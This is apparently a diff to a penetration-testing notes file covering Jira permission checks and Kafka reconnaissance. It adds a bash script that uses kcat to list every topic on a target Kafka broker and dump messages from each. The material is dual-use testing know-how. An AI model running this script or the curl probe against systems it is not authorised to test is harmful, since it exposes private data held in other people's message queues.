@@ -641,7 +641,7 @@ In Jira, privileges can be checked by any user, authenticated or not, through th
 curl https://org.atlassian.net/rest/api/2/mypermissions | jq | grep -iB6 '"havePermission": true'
 ```
 
-## Kafka Recon
+## Pentesting Kafka
 
 Use Nmap to detect Kafka brokers and check for open ports:
 
@@ -662,6 +662,26 @@ Metadata for all topics (from broker -1: target.com:9092/bootstrap):
   topic "AlertNotifications" with 1 partitions:
     partition 0, leader 1, replicas: 1, isrs: 1
   topic "__consumer_offsets" with 50 partitions:
+```
+
+Enumerating brokers script:
+
+```sh
+#!/usr/bin/env bash
+
+TARGET=$1
+PORT=${2:-9092}
+
+if [ -z "$TARGET" ]; then
+  echo "Usage: $0 <target.com>"
+  exit 1
+fi
+
+# Read all topics
+for topic in $(kcat -b $TARGET:$PORT -L | grep topic | awk '{print $2}' | sed 's/"//g'); do
+  echo "[*] Topic: $topic"
+  kcat -b $TARGET:$PORT -t $topic -C -c 10
+done
 ```
 
 Save messages for offline analysis;
